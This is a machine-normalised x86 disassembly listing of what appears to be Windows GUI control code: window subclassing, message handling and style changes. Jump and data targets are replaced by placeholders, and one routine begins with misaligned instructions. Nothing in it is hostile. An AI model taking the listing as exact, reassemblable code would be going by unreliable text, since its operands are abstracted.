jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f74
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x295 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448198
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_444f9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445075
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0x82
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x264 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x260 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
push ebp
call sub_444e60
pop ecx
jmp r-xdata
sub_445094
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445175
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b284
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b19c
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b34c
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_445194
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c380
mov ecx edi
mov edx esi
call sub_42c800
pop edi
pop esi
pop ebx
retn
sub_4451b4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_4471e0
cmp [ ebx + 0x277 ] 0x0
je r-xdata
mov esi 0x4
cmp [ ebx + 0x278 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x27a ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x275 ] 0x0
je r-xdata
or esi 0x20
cmp [ ebx + 0x276 ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x294 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x279 ] 0x1
je r-xdata
or esi 0x2000
mov al [ r-xdata ]
and al [ ebx + 0x279 ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x279 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x279 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_45c380
mov edx esi
call sub_42ca64
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_4471e0
sub_4452b0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x22c ]
call sub_443bd0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x24c ]
call sub_4031ec
xor eax eax
mov [ ebx + 0x24c ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
mov al [ eax + 0x2a ]
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
pop edx
call sub_4435ac
mov edx esp
mov ecx 0x1
mov ebp [ eax ]
call [ ebp + 0xc ]
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
mov dl [ esp ]
call sub_4435ac
jmp r-xdata
mov eax [ ebx + 0x24c ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_44533c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x24c ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41b420
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x24c ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x24c ]
call sub_41b3bc
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x22c ]
call sub_443bd0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_443c00
call sub_443568
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x24c ]
mov ebp [ eax ]
call [ ebp + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4453c0
push ebx
push esi
push edi
mov ebx eax
cmp dl [ ebx + 0x274 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x274 ] dl
mov eax ebx
call sub_4451b4
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_443bd0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4452b0
jmp r-xdata
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
call sub_443a48
push eax
mov eax ebx
call sub_45c380
pop edx
call sub_42c99c
test eax eax
setne al
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
pop edx
mov [ eax + 0x2a ] dl
inc esi
dec edi
jne r-xdata
sub_445468
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x279 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x279 ] al
mov eax ebx
call sub_4451b4
sub_445490
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x244 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x22c ]
call sub_443cc4
mov [ esi + 0x244 ] bl
mov eax esi
call sub_4598e8
sub_445534
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
mov cl 0x1
mov edx 0x3
call sub_44375c
mov eax ebx
call sub_4472a8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4472a8
xor ecx ecx
mov edx 0x3
call sub_44375c
pop esi
pop ebx
retn
sub_4455c4
push ebx
mov ebx eax
mov eax [ ebx + 0x70 ]
call sub_4242e8
push eax
mov eax ebx
call sub_45c380
pop edx
call sub_42c8fc
mov eax [ ebx + 0x70 ]
call sub_4242e8
push eax
mov eax ebx
call sub_45c380
pop edx
call sub_42c6c4
pop ebx
retn
sub_4455f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x268 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x268 ] esi
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_45c380
mov edx esi
call sub_42ca18
sub_445628
push ebx
mov ebx eax
mov eax ebx
call sub_45b87c
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_4455c4
sub_44564c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b960
pop esi
pop ebx
retn
mov eax ebx
call sub_4598e8
sub_445670
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44586f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_45a658
mov eax ebx
call sub_4458a0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445876
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
mov eax [ esi + 0x8 ]
mov eax [ eax ]
cmp eax [ ebx + 0x264 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffec9
je r-xdata
mov [ ebx + 0x295 ] 0x1
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax edx
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov edx [ eax + 0xc ]
mov eax ebx
call sub_448198
mov esi eax
mov eax [ esi + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
mov edi edx
mov edx [ edi + 0xc ]
mov eax ebx
call sub_448198
mov esi eax
mov eax ebx
call sub_45c380
mov edx [ edi + 0xc ]
call sub_42c88c
mov edx eax
mov eax esi
call sub_442cfc
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
call GetMessagePos
call sub_406c38
movzx eax ax
push eax
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0x8 ]
pop edx
call sub_4060b4
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_455590
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax ebx
call sub_45c380
push eax
call ChildWindowFromPoint
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax esi
call sub_442cfc
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov eax ebx
call sub_45c380
cmp esi eax
je r-xdata
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0xc ]
mov edx 0x50
call sub_4045c8
mov eax [ ebp - 0xc ]
call sub_40423c
push eax
mov eax [ ebp - 0xc ]
call sub_40443c
push eax
push esi
call GetClassNameA
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4045c8
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404388
jne r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_455590
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push 0x1206
push esi
call SendMessageA
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_448198
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax ebx
mov si 0xffaf
call sub_4033e8
sub_4458ac
push ebx
mov ebx eax
mov eax ebx
call sub_45b8a4
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_4455a4
mov eax ebx
call sub_4458a0
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x264 ]
push eax
call InvalidateRect
sub_445914
push ebx
push esi
mov esi edx
mov ebx [ eax + 0x234 ]
mov dl [ esi + 0x8 ]
mov eax ebx
call sub_44457c
mov dl [ esi + 0x9 ]
mov eax ebx
call sub_444590
mov dl [ esi + 0xa ]
mov eax ebx
call sub_4445a4
pop esi
pop ebx
retn
sub_445940
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x215 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x215 ] dl
mov eax ebx
call sub_45c684
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
mov esi eax
and esi 0xfffffffc
xor eax eax
mov al [ ebx + 0x215 ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_45c380
push eax
call SetWindowLongA
mov eax ebx
call sub_447508
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x234 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_4474e8
mov dl 0x3
mov eax ebx
call sub_4474e8
jmp r-xdata
sub_4459c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b548
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x264 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x260 ] eax
mov eax [ ebx + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x264 ]
push eax
call SetWindowLongA
sub_445a14
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_4472a8
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4472a8
call sub_443a48
mov esi eax
sub_445a3c
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
pop ebx
retn
sub_445a64
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_445ab0
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
mov al 0x1
pop ebx
retn
sub_445ad8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
xor eax eax
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_445b0c
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x372 ] 0x0
je r-xdata
mov ecx [ ebx + 0x22c ]
mov dl 0x1
mov eax [ esp ]
call sub_44346c
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
sub_445b58
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_445ba4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_445cc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x22c ]
call sub_443c00
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445ccc
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax ebx
call sub_445b58
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f7c
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_408b80
jmp r-xdata
mov cl [ ebp - 0x5 ]
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x9 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_403fd0
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_445cec
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_445d10
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_445d59
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff5c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446a0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff97
jg r-xdata
cmp eax 0xffffff9c
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edi eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4033e8
test al al
jne r-xdata
cmp eax 0xffffff8d
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443c00
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4033e8
test al al
jne r-xdata
sub eax 0xffffff98
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff8f
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a15
lea eax [ ebp - 0x9c ]
call sub_403f7c
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
mov edx [ ebp - 0x8 ]
mov ebx esi
xor edx edx
push ebp
push sub_446539
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_42538c
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebx + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x231 ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443bd0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
call sub_42c834
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x14 ]
call sub_445d10
push eax
mov eax [ ebx + 0x18 ]
call sub_445d10
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
jmp r-xdata
sub eax 0xfffffecc
je r-xdata
test eax 0x20000
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_443c00
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4033e8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x28 ]
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4033e8
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x97
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x28
call sub_402bf8
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x58 ] eax
test [ ebx + 0xc ] 0x10002
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443c00
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4033e8
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44729c
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4033e8
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44729c
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35a ] 0x0
je r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebx + 0xc ]
test eax 0x10001
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
call sub_403a64
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_445fc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4257b8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425658
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425674
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4257b8
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443c00
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4033e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44729c
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44729c
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44729c
pop edx
call sub_442cfc
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460c4c
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_476828
